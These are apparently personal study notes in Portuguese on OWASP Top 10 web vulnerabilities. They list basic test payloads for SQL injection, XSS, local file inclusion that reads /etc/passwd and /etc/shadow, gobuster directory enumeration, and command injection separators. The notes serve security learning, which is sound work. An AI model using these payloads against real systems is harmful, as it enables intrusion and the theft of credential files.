# Vulnerabilidades Web

Anotacoes sobre as principais vulnerabilidades web com base no OWASP Top 10.

## SQL Injection

Ocorre quando input do usuario e inserido diretamente em queries SQL sem sanitizacao.

```sql
-- Teste basico
' OR '1'='1
' OR '1'='1' --
' UNION SELECT NULL--
```

Ferramentas: sqlmap, Burp Suite

## Cross-Site Scripting (XSS)

Injecao de scripts maliciosos em paginas visualizadas por outros usuarios.

```html
<!-- Teste basico -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
```

## Local File Inclusion (LFI)

Leitura de arquivos locais do servidor via parametros da URL.

```
# Exemplos de teste
?page=../../../../etc/passwd
?file=../../../etc/shadow
```

## Directory Traversal

```bash
# Enumeracao de diretorios com gobuster
gobuster dir -u http://<alvo> -w /usr/share/wordlists/dirb/common.txt
```

## Command Injection

Execucao de comandos no sistema via campos de input vulneraveis.

```bash
# Testes basicos
; id
&& whoami
| ls -la
```
